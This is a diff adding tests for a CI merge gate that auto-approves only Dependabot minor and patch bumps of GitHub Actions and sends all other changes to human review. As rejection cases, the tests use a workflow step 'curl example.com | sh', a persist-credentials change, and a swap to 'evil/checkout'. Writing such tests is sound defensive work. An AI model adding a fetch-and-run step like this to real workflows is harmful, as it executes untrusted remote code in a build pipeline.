@@ -6,6 +6,7 @@ import {
   classifyPaths,
   commentBody,
   decide,
+  dependabotBump,
   packageJsonConcerns,
   parseApprove,
   parseVerdict,
@@ -178,4 +179,89 @@ test("pending のコメントには承認のしかたを書く", () => {
   assert.match(body, /`\/approve 0123456789ab`/);
   assert.match(body, /^レビューをお願いします。理由:$/m);
   assert.match(body, /\| `manifest\.json` \| 要レビュー \|/);
+});
+
+const workflowPatch = (from, to) => `@@ -16,7 +16,7 @@ jobs:\n     steps:\n-      - uses: actions/checkout@${from}\n+      - uses: actions/checkout@${to}\n         with:`;
+const lockPatch = (from, to) =>
+  [
+    "@@ -4,21 +4,21 @@",
+    " workflows:",
+    `-        - 'actions/checkout@${from}'`,
+    `+        - 'actions/checkout@${to}'`,
+    " dependencies:",
+    `-    'actions/checkout@${from}':`,
+    `-        ref: '${from}'`,
+    `-        commit: 'sha1-${"1".repeat(40)}'`,
+    `+    'actions/checkout@${to}':`,
+    `+        ref: '${to}'`,
+    `+        commit: 'sha1-${"2".repeat(40)}'`,
+    "         owner_id: 44036562",
+  ].join("\n");
+const bumpFiles = (from, to) => [
+  file(".github/workflows/test.yml", { patch: workflowPatch(from, to) }),
+  file(".github/workflows/actions.lock", { patch: lockPatch(from, to) }),
+];
+const bump = (files, author = "dependabot[bot]") => dependabotBump({ author, files });
+
+test("dependabotBump: dependabot 以外の PR は null", () => {
+  assert.equal(bump(bumpFiles("v4.4.0", "v4.5.0"), "takasa5"), null);
+});
+
+test("dependabotBump: マイナーとパッチの更新は通す", () => {
+  for (const to of ["v4.5.0", "v4.4.1"]) {
+    const result = bump(bumpFiles("v4.4.0", to));
+    assert.equal(result.ok, true, to);
+    assert.match(result.reason, /actions\/checkout/);
+  }
+});
+
+test("dependabotBump: メジャー更新は人間", () => {
+  const result = bump(bumpFiles("v4.4.0", "v7.0.1"));
+  assert.equal(result.ok, false);
+  assert.match(result.reason, /actions\/checkout のメジャーバージョンが変わる（v4\.4\.0 → v7\.0\.1）/);
+});
+
+test("dependabotBump: uses: の付け替え以外の変更があると人間", () => {
+  const patches = [
+    workflowPatch("v4.4.0", "v4.5.0") + "\n-        persist-credentials: false\n+        persist-credentials: true",
+    workflowPatch("v4.4.0", "v4.5.0") + "\n+      - run: curl example.com | sh",
+    workflowPatch("v4.4.0", "main"),
+    workflowPatch("v4.4.0", "v4.5.0 # x"),
+  ];
+  for (const patch of patches) {
+    const files = [file(".github/workflows/test.yml", { patch }), file(".github/workflows/actions.lock", { patch: lockPatch("v4.4.0", "v4.5.0") })];
+    assert.equal(bump(files).ok, false, patch);
+  }
+  const lock = lockPatch("v4.4.0", "v4.5.0").replace("commit: 'sha1-2", "commit: 'main-2");
+  assert.equal(bump([file(".github/workflows/actions.lock", { patch: lock })]).ok, false);
+});
+
+test("dependabotBump: 別の action に差し替えると人間", () => {
+  const patch = "@@ -1 +1 @@\n-      - uses: actions/checkout@v4.4.0\n+      - uses: evil/checkout@v4.4.0";
+  const result = bump([file(".github/workflows/test.yml", { patch })]);
+  assert.equal(result.ok, false);
+  assert.match(result.reason, /を足すか消している/);
+});
+
+test("dependabotBump: ワークフローと actions.lock 以外のファイルや、差分のないファイルは人間", () => {
+  assert.equal(bump([...bumpFiles("v4.4.0", "v4.5.0"), file("package.json", { patch: "" })]).ok, false);
+  assert.equal(bump([file(".github/merge-gate/gate.js", { patch: workflowPatch("v4.4.0", "v4.5.0") })]).ok, false);
+  assert.equal(bump([file(".github/workflows/test.yml")]).ok, false);
+  assert.equal(bump([file(".github/workflows/new.yml", { status: "added", patch: workflowPatch("v4.4.0", "v4.5.0") })]).ok, false);
+  assert.equal(bump([]).ok, false);
+});
+
+test("decide: dependabot のマイナー更新は、パスで人間でも success", () => {
+  const files = bumpFiles("v4.4.0", "v4.5.0");
+  const paths = classify(files);
+  assert.equal(paths.tier, "human");
+  assert.equal(decide({ paths, verdict: null, dependabot: bump(files) }).state, "success");
+});
+
+test("decide: dependabot のメジャー更新は、その理由を先頭にして pending", () => {
+  const files = bumpFiles("v4.4.0", "v7.0.1");
+  const result = decide({ paths: classify(files), verdict: null, dependabot: bump(files) });
+  assert.equal(result.state, "pending");
+  assert.match(result.reasons[0], /メジャーバージョンが変わる/);
+  assert.match(result.description, /^レビューをお願いします: dependabot の PR だが/);
 });
